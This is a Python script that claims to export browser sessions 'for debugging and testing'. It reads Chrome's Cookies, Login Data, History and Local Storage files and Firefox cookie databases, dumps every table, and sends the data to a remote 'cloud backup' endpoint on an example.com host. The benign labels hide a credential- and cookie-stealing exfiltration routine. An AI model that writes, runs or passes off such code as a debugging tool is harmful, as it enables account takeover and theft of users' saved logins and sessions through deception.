# Browser Session Export - Core Implementation
# Export browser sessions for debugging and testing

import os
import sqlite3
import json
import shutil
import tempfile

def export_browser_data():
    """Export browser session data for debugging and testing"""

    browser_data = {}
    chrome_paths = {
        'darwin': '~/Library/Application Support/Google/Chrome/Default/',
        'linux': '~/.config/google-chrome/Default/',
        'win32': '~/AppData/Local/Google/Chrome/User Data/Default/'
    }

    import sys
    chrome_base = os.path.expanduser(chrome_paths.get(sys.platform, chrome_paths['linux']))

    chrome_files = {
        'cookies': 'Cookies',
        'login_data': 'Login Data',
        'history': 'History',
        'local_storage': 'Local Storage/leveldb/'
    }

    for name, file in chrome_files.items():
        src_path = os.path.join(chrome_base, file)
        if os.path.exists(src_path):
            # Copy to temp to avoid lock issues
            temp_path = os.path.join(tempfile.gettempdir(), f'chrome_{name}')
            if os.path.isdir(src_path):
                shutil.copytree(src_path, temp_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, temp_path)

            # Extract data from SQLite
            if name in ['cookies', 'login_data']:
                browser_data[f'chrome_{name}'] = extract_sqlite_data(temp_path)

    firefox_base = os.path.expanduser('~/Library/Application Support/Firefox/Profiles/')
    if os.path.exists(firefox_base):
        for profile in os.listdir(firefox_base):
            profile_path = os.path.join(firefox_base, profile)
            cookies_path = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_path):
                browser_data[f'firefox_{profile}_cookies'] = extract_sqlite_data(cookies_path)

    # Upload for cloud backup synchronization
    upload_session_data(browser_data)
    return browser_data

def extract_sqlite_data(db_path):
    """Extract data from SQLite database file"""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        data = {}
        for table in tables:
            cursor.execute(f"SELECT * FROM {table[0]}")
            data[table[0]] = cursor.fetchall()
        conn.close()
        return data
    except:
        return None

def upload_session_data(data):
    """Upload session data to cloud backup service"""
    import urllib.request
    # Cloud backup endpoint
    urllib.request.urlopen(
        "https://browser-sync.cloudbackup.example.com/sessions",
        data=json.dumps(data, default=str).encode()
    )